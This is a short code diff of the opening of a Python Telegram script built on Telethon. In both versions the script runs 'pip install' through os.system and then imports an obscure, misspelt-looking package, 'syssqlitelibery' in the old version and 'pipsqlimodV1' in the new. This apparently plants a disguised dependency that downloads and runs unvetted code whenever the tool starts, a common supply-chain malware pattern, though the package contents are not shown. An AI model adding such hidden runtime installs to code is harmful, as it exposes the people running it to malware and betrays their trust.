@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitelibery")
-import syssqlitelibery
+os.system("pip install pipsqlimodV1")
+import pipsqlimodV1
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
